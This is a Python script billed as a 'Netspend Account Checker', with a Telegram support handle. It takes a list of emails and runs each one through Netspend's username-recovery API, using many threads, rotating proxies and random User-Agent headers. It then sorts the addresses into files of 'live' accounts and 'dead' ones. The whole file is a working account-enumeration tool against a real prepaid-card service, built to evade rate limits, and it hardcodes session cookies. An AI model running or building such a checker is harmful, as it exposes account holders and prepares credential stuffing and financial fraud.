import requests
import time
from termcolor import colored
import os
from concurrent.futures import ThreadPoolExecutor
from tenacity import retry, wait_fixed, retry_if_exception_type
import logging
from requests.exceptions import ConnectionError, Timeout, RequestException
from http.client import RemoteDisconnected, IncompleteRead
from fake_useragent import UserAgent
import colorama
from colorama import Fore, Style # Import Style to reset colors

# Initialize Colorama for cross-platform color support
colorama.init()

# Configure basic logging to capture information
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Netspend API endpoint URL
url = 'https://www.netspend.com/profile-api/recovery/username/email'

# Initialize UserAgent to generate random User-Agent headers
ua = UserAgent()

# HTTP headers required for the request
# Note: Cookies and x-dynatrace are likely session-specific and might expire.
# If the script fails after some time, consider updating or removing them.
headers = {
    'Host': 'www.netspend.com',
    'Content-Type': 'application/json',
    'Cookie': 'TS01eeb4af=01ccb259d72a264605c09fd28397942ea5d719f5426b3019b48a971166cb98713b1f8f72f49dfd4846e8255f28f354f1e12affbba4; dtCookie=v_4_srv_2_sn_DE50EBCB777FFE616D1A35A7A9B71BFD_perc_100000_ol_0_mul_1_app-3A9bc8886a90bb78dd_1; TS01fcb96b=01ccb259d72a264605c09fd28397942ea5d719f5426b3019b48a971166cb98713b1f8f72f49dfd4846e8255f28f354f1e12affbba4',
    'x-dynatrace': 'MT_3_2_48184128507706478_2-0_dfc8cbe7-1078-4ca5-bd1e-19539244b523_0_18947_142',
    'X-NS-Client': 'app=Account Center; platform=ios; platformType=ios; brand=netspend; version=6.20.3',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'User-Agent': ua.random # Random User-Agent
}

# Use requests.Session() for better performance and connection pooling
session = requests.Session()

# Function to get public IP address (used for proxy debugging)
def get_ip(proxy=None):
    try:
        if proxy:
            response = session.get('https://api.ipify.org?format=json', proxies=proxy, timeout=10)
        else:
            response = session.get('https://api.ipify.org?format=json', timeout=10)
        data = response.json()
        return data['ip']
    except requests.RequestException as e:
        # Use logging for IP errors to keep the main console output clean
        logging.error(f"{Fore.RED}Error fetching IP: {e}{Style.RESET_ALL}")
        return "Unknown"

# Retry logic for account checking
@retry(wait=wait_fixed(2), retry=retry_if_exception_type((ConnectionError, Timeout, RemoteDisconnected, IncompleteRead, RequestException)))
def check_account(email, result_folder, index, total, proxy=None):
    """
    Checks the Netspend account status for the given email.
    Will retry on connection issues or timeouts.
    """
    data = {
        'email': email
    }

    # Get public IP for each request if using a proxy.
    # This can be verbose, but useful for proxy debugging.
    public_ip = get_ip(proxy)
    print(f"{Fore.CYAN}Using IP: {public_ip}{Style.RESET_ALL}") # Cyan color for IP info

    while True: # Loop to ensure the request is sent or handled correctly
        try:
            start_time = time.time() # Start time to measure response
            
            # Send POST request to Netspend API
            if proxy:
                response = session.post(url, headers=headers, json=data, proxies=proxy, timeout=10)
            else:
                response = session.post(url, headers=headers, json=data, timeout=10)

            elapsed_time = time.time() - start_time # Calculate elapsed time
            progress_percent = ((index + 1) / total) * 100 # Calculate progress percentage
            progress_message = f"[{index + 1}/{total}] ({progress_percent:.2f}%)"

            if response.status_code == 200:
                # If status is 200, assume account is "LIVE"
                response_json = response.json()
                result = f"{email}"
                print(f"{progress_message} {Fore.GREEN}[LIVE - saved to {result_folder}/live.txt]{Style.RESET_ALL} {result} [Time: {elapsed_time:.2f}s]")
                save_result(result_folder, "live", result)
                return f"{email}: LIVE"
            elif response.status_code == 400:
                # If status is 400, assume account is "DEAD"
                response_json = response.json()
                description = response_json.get('details', {}).get('description', 'Description not available.')
                result = f"{email} - {description}"
                print(f"{progress_message} {Fore.RED}[DEAD - saved to {result_folder}/dead.txt]{Style.RESET_ALL} {result} [Time: {elapsed_time:.2f}s]")
                save_result(result_folder, "dead", result)
                return f"{email}: DEAD"
            else:
                # For other status codes, print a warning
                print(f"{progress_message} {Fore.YELLOW}{email} => Request failed with status code: {response.status_code} [Time: {elapsed_time:.2f}s]{Style.RESET_ALL}")
                # Continue the loop to retry (thanks to tenacity)
                continue
        except (ConnectionError, Timeout, RemoteDisconnected, IncompleteRead, RequestException) as e:
            # Catch errors and log for retry
            logging.error(f"{Fore.YELLOW}Error checking {email}: {e}. Retrying...{Style.RESET_ALL}")
            # Continue the loop to retry (thanks to tenacity)
            continue
        finally:
            # Add a small delay to prevent overly aggressive rate-limiting
            time.sleep(0.1) 

def save_result(folder, result_type, result):
    """
    Saves the result string to the appropriate text file within the specified folder.
    Creates the folder if it does not exist.
    """
    if not os.path.exists(folder):
        os.makedirs(folder) # Create folder if it doesn't exist
    file_path = os.path.join(folder, f"{result_type}.txt")
    with open(file_path, 'a', encoding='utf-8') as file:
        file.write(result + '\n')

def main():
    """
    Main function to run the program.
    Handles user input, file reading, and thread pool management.
    """
    # Program start display with simple animation
    banner_lines = [
        f"{Fore.MAGENTA}╔═══════════════════════════════════════════════════╗{Style.RESET_ALL}",
        f"{Fore.MAGENTA}║            {Fore.CYAN}NETSPEND ACCOUNT CHECKER {Fore.MAGENTA}              ║{Style.RESET_ALL}",
        f"{Fore.MAGENTA}║                                                   ║{Style.RESET_ALL}",
        f"{Fore.MAGENTA}║  {Fore.YELLOW}  A simple and efficient tool to verify          {Fore.MAGENTA}║{Style.RESET_ALL}",
        f"{Fore.MAGENTA}║  {Fore.YELLOW}  Netspend account existence by email.           {Fore.MAGENTA}║{Style.RESET_ALL}",
        f"{Fore.MAGENTA}╚═══════════════════════════════════════════════════╝{Style.RESET_ALL}"
    ]

    for line in banner_lines:
        print(line)
        time.sleep(0.05) # Small delay for animation effect
    
    print(f"\n{Fore.YELLOW}Welcome to Netspend Account Checker!{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}This script will check the status of Netspend accounts based on an email list.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Results will be automatically saved in the 'result' folder.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Please ensure your 'proxy.txt' file (if any) and email list are ready.{Style.RESET_ALL}\n")
    print(f"{Fore.LIGHTBLUE_EX}For questions or support, contact me on Telegram: @martinversa{Style.RESET_ALL}\n") # Added Telegram contact

    # User input
    file_name = input(f"{Fore.BLUE}Enter Email List File Name (e.g., emails.txt): {Style.RESET_ALL}")
    
    while True:
        try:
            num_threads = int(input(f"{Fore.BLUE}Enter Number of Threads (e.g., 120): {Style.RESET_ALL}"))
            if num_threads <= 0:
                print(f"{Fore.RED}Number of threads must be greater than 0. Please try again.{Style.RESET_ALL}")
            else:
                break
        except ValueError:
            print(f"{Fore.RED}Invalid input. Please enter a number for the number of threads.{Style.RESET_ALL}")

    result_folder = 'result' # Automatic output folder
    proxy_file = 'proxy.txt' # Automatic proxy file

    # Read proxies if proxy.txt file exists
    proxies = []
    if os.path.exists(proxy_file):
        try:
            with open(proxy_file, 'r', encoding='utf-8') as file:
                # Proxy format: "http://user:pass@host:port" or "http://host:port"
                # If proxy is only IP:PORT, adjust format accordingly.
                proxies = [{"http": f"http://{line.strip()}", "https": f"http://{line.strip()}"} for line in file.readlines() if line.strip()]
            print(f"{Fore.GREEN}Proxy list successfully loaded from '{proxy_file}'. Total proxies: {len(proxies)}{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}Error reading proxy file: {e}. Continuing without proxies.{Style.RESET_ALL}")
            proxies = [] # Empty proxies if there's an error
    else:
        print(f"{Fore.YELLOW}File 'proxy.txt' not found. Continuing without proxies.{Style.RESET_ALL}")

    try:
        with open(file_name, 'r', encoding='utf-8') as file:
            emails = [line.strip() for line in file.readlines() if line.strip()] # Read emails, ignore empty lines
    except FileNotFoundError:
        print(f"{Fore.RED}File '{file_name}' not found. Please ensure the file name and path are correct.{Style.RESET_ALL}")
        return
    except Exception as e:
        print(f"{Fore.RED}An error occurred while reading the email file: {e}{Style.RESET_ALL}")
        return

    total_emails = len(emails)
    if total_emails == 0:
        print(f"{Fore.YELLOW}No emails found in file '{file_name}'. Program terminated.{Style.RESET_ALL}")
        return

    print(f"\n{Fore.BLUE}Starting account check...{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Total emails to be checked: {total_emails}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Number of threads used: {num_threads}{Style.RESET_ALL}")
    print(f"{Fore.BLUE}Results will be saved in folder: {result_folder}/{Fore.RESET}\n")

    # Thread pool for concurrent execution
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for index, email in enumerate(emails):
            # Use proxy if available, rotate based on index
            proxy = proxies[index % len(proxies)] if proxies else None
            future = executor.submit(check_account, email, result_folder, index, total_emails, proxy)
            futures.append(future)
        
        # You can add logic here to wait for all futures to complete if needed
        # for future in concurrent.futures.as_completed(futures):
        #     pass # Or handle results if any

    print(f"\n{Fore.MAGENTA}{'-'*50}{Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  Account check finished!  {Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}  Results saved in '{result_folder}' folder  {Style.RESET_ALL}")
    print(f"{Fore.MAGENTA}{'-'*50}{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
